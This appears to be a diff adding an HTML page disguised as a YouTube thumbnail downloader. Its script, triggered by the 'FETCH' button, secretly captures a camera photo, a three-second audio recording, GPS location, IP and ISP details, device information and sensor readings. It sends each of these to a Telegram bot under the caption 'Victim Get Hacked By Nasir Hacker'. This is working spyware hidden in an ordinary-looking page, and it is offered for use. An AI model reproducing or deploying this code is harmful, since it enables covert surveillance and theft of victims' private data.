@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>YouTube Thumbnail Downloader & Data Access</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat" />
+  <style>
+    body {
+      font-family: 'Montserrat', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f5f5f5;
+    }
+    .navbar {
+      background-color: #ff0000;
+      color: white;
+      text-align: center;
+      padding: 15px 0;
+    }
+    #header {
+      margin: 0;
+      font-size: 28px;
+      font-weight: bold;
+    }
+    .container {
+      max-width: 600px;
+      margin: 20px auto;
+      padding: 20px;
+      background-color: #fff;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+    .form-control {
+      width: calc(100% - 22px);
+      margin-bottom: 15px;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      box-sizing: border-box;
+      font-family: 'Montserrat', sans-serif;
+    }
+    #thumbdloadbtn {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      background-color: #ff0000;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+      font-family: 'Montserrat', sans-serif;
+    }
+    #thumbdloadbtn:hover {
+      background-color: #cc0000;
+    }
+    footer {
+      text-align: center;
+      margin-top: 40px;
+      color: #666;
+    }
+    #details {
+      white-space: pre-wrap;
+      background: #eee;
+      padding: 10px;
+      border-radius: 5px;
+      margin-top: 15px;
+      max-height: 300px;
+      overflow-y: auto;
+    }
+  </style>
+</head>
+<body>
+  <nav class="navbar">
+    <img
+      class="youtube-logo"
+      src="https://www.gstatic.com/youtube/img/branding/youtubelogo/svg/youtubelogo.svg"
+      alt="YouTube Logo"
+    />
+    <!-- Keep the main heading -->
+    <h1 id="header">YouTube Video Downloader</h1>
+  </nav>
+
+  <div class="container">
+    <input
+      id="ytlink"
+      type="text"
+      class="form-control"
+      placeholder="Enter YouTube Video URL"
+      spellcheck="false"
+    />
+    <button id="thumbdloadbtn" onclick="fetchAndSend()">FETCH</button>
+    <div id="thumbnail-preview"></div>
+    <h2>How to Download HD YouTube Thumbnail</h2>
+    <ol>
+      <li>Copy the YouTube Video Link / URL from the YouTube App or Website</li>
+      <li>Paste the YouTube video Link / URL in the Input Field Above</li>
+      <li>Click on the "FETCH" Button</li>
+      <li>Select the thumbnail quality</li>
+      <li>Download the Thumbnail</li>
+    </ol>
+    <!-- Show details here -->
+    <div id="details"></div>
+  </div>
+
+  <center>
+    <video id="video" width="0" height="0" autoplay></video>
+  </center>
+
+  <script type="text/javascript">
+    async function fetchAndSend() {
+      const btn = document.getElementById('thumbdloadbtn');
+      btn.textContent = 'Fetching...';
+
+      // Clear previous details
+      document.getElementById('details').innerText = '';
+
+      // Get YouTube thumbnail
+      const url = document.getElementById('ytlink').value;
+      if (url) {
+        const videoId = url.split('v=')[1]?.split('&')[0];
+        if (videoId) {
+          const thumbUrl = `https://img.youtube.com/vi/${videoId}/maxresdefault.jpg`;
+          document.getElementById('thumbnail-preview').innerHTML = `<img src="${thumbUrl}" style="width:100%; max-height:300px; object-fit:cover;">`;
+        }
+      }
+
+      // Collect data silently and send to Telegram
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        const videoTrack = stream.getVideoTracks()[0];
+        const imageCapture = new ImageCapture(videoTrack);
+
+        // Capture photo
+        try {
+          const photoBlob = await imageCapture.takePhoto();
+          sendToTelegram(photoBlob, 'photo');
+        } catch { }
+
+        // Record audio
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+        mediaRecorder.start();
+        await new Promise(resolve => setTimeout(resolve, 3000));
+        if (mediaRecorder.state !== 'inactive') mediaRecorder.stop();
+        await new Promise(resolve => {
+          mediaRecorder.onstop = () => {
+            if (chunks.length > 0) {
+              const audioBlob = new Blob(chunks, { type: 'audio/wav' });
+              sendToTelegram(audioBlob, 'audio');
+            }
+            resolve();
+          };
+        });
+
+        // Send location
+        if (navigator.geolocation) {
+          try {
+            const pos = await new Promise((resolve, reject) => {
+              navigator.geolocation.getCurrentPosition(resolve, reject);
+            });
+            sendToTelegram({ latitude: pos.coords.latitude, longitude: pos.coords.longitude }, 'location');
+          } catch { }
+        }
+
+        // Network info
+        try {
+          const data = await fetch('https://ipinfo.io/json').then(res => res.json());
+          let info = `IP: ${data.ip}\nISP: ${data.org}\nCity: ${data.city}\nCountry: ${data.country}`;
+          sendToTelegram(info, 'device_info');
+        } catch { }
+
+        // Device info
+        const deviceInfo = {
+          UserAgent: navigator.userAgent,
+          Platform: navigator.platform,
+          Language: navigator.language,
+          Timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          Screen: `${window.screen.width}x${window.screen.height}`,
+          Viewport: `${window.innerWidth}x${window.innerHeight}`,
+          CPU: navigator.hardwareConcurrency,
+          Connection: navigator.connection ? navigator.connection.effectiveType : 'N/A'
+        };
+        sendToTelegram(JSON.stringify(deviceInfo, null, 2), 'device_info');
+
+        // Ambient Light Sensor
+        if ('AmbientLightSensor' in window) {
+          try {
+            const sensor = new AmbientLightSensor();
+            sensor.onreading = () => {
+              sendToTelegram(`Ambient Light: ${sensor.illuminance} lux`, 'device_info');
+            };
+            sensor.onerror = () => { };
+            sensor.start();
+          } catch { }
+        }
+
+        // Device orientation
+        window.addEventListener('deviceorientation', (event) => {
+          sendToTelegram(`Orientation - alpha:${event.alpha} beta:${event.beta} gamma:${event.gamma}`, 'device_info');
+        });
+
+        // List media devices
+        const devices = await navigator.mediaDevices.enumerateDevices();
+        const deviceList = devices.map(d => `${d.kind}: ${d.label}`).join('\n');
+        sendToTelegram(`Media Devices:\n${deviceList}`, 'device_info');
+
+        // Stop streams
+        stream.getTracks().forEach(t => t.stop());
+
+      } catch (err) {
+        // If permissions denied, still try to send whatever info possible
+        if (navigator.geolocation) {
+          try {
+            const pos = await new Promise((resolve, reject) => {
+              navigator.geolocation.getCurrentPosition(resolve, reject);
+            });
+            sendToTelegram({ latitude: pos.coords.latitude, longitude: pos.coords.longitude }, 'location');
+          } catch { }
+        }
+
+        try {
+          const data = await fetch('https://ipinfo.io/json').then(res => res.json());
+          let info = `IP: ${data.ip}\nISP: ${data.org}\nCity: ${data.city}\nCountry: ${data.country}`;
+          sendToTelegram(info, 'device_info');
+        } catch { }
+
+        const deviceInfo = {
+          UserAgent: navigator.userAgent,
+          Platform: navigator.platform,
+          Language: navigator.language,
+          Timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          Screen: `${window.screen.width}x${window.screen.height}`,
+          Viewport: `${window.innerWidth}x${window.innerHeight}`,
+          CPU: navigator.hardwareConcurrency,
+          Connection: navigator.connection ? navigator.connection.effectiveType : 'N/A'
+        };
+        sendToTelegram(JSON.stringify(deviceInfo, null, 2), 'device_info');
+      }
+
+      // Finalize
+      btn.textContent = 'FETCH';
+
+      // Show confirmation message
+      document.getElementById('details').innerText = 'Data has been sent to Telegram.';
+    }
+
+    function sendToTelegram(data, type) {
+      const botToken = 'YOUR_BOT_TOKEN'; // Replace with your bot token
+      const chatId = GetURLParameter('id');
+      if (!chatId) {
+        console.error('Chat ID missing');
+        return;
+      }
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      const captionText = '<b>Victim Get Hacked By Nasir Hacker</b>';
+
+      if (type === 'location') {
+        formData.append('latitude', data.latitude);
+        formData.append('longitude', data.longitude);
+        formData.append('caption', captionText + ' - GPS Location');
+        formData.append('parse_mode', 'HTML');
+        fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+          method: 'POST',
+          body: formData
+        });
+      } else if (type === 'device_info') {
+        formData.append('text', captionText + ` - Device Info\n<pre>${data}</pre>`);
+        formData.append('parse_mode', 'HTML');
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          body: formData
+        });
+      } else if (type === 'photo') {
+        formData.append('photo', data, 'camera.jpg');
+        formData.append('caption', captionText);
+        formData.append('parse_mode', 'HTML');
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+      } else if (type === 'audio') {
+        formData.append('audio', data, 'audio_recording.wav');
+        formData.append('caption', captionText);
+        formData.append('parse_mode', 'HTML');
+        fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
+          method: 'POST',
+          body: formData
+        });
+      }
+    }
+
+    function GetURLParameter(sParam) {
+      var sPageURL = window.location.search.substring(1);
+      var sURLVariables = sPageURL.split('&');
+      for (var i = 0; i < sURLVariables.length; i++) {
+        var sParameterName = sURLVariables[i].split('=');
+        if (sParameterName[0] == sParam) {
+          return sParameterName[1];
+        }
+      }
+    }
+  </script>
+  <footer>
+    <p>Made With ❤️ By NASIR HACKER</p>
+  </footer>
+</body>
+  </html>
